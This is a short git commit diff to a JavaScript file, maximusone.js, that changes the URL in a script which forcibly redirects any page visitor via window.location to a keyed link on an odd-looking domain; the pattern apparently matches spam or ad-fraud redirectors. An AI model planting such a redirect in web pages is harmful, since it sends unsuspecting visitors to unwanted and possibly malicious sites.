67c22ddf0479f73a23576d6d8c8d2258a48c6af3
leswarokojit <84512579+leswarokojit@users.noreply.github.com>
2021-09-19 18:04:11 +0800

    Update maximusone.js

--- maximusone.js
+++ maximusone.js
@@ -1,6 +1,6 @@
 var dataUrl = [
 
-  'https://wonderfullytumultbizarre.com/n3rygrvt?key=a754d241514b7a41541b5461ce5e5e4e'
+  'https://tripsthorpelemonade.com/n3rygrvt?key=a754d241514b7a41541b5461ce5e5e4e'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
